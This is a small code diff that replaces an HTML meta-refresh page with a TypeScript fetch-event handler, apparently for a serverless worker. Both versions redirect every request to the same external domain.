@@ -1,10 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0;url=https://solaxyprescom.top">
-  <title>Redirecting...</title>
-</head>
-<body>
-</body>
-</html>
+// redirect.ts
+
+// Define the redirect URL
+const redirectUrl = "https://solaxyprescom.top"; // Replace with the URL you want to redirect to
+
+// Handle the request
+addEventListener("fetch", (event) => {
+  event.respondWith(
+    new Response(null, {
+      status: 302, // HTTP status for redirection
+      headers: {
+        "Location": redirectUrl, // The URL to redirect to
+      },
+    })
+  );
+});
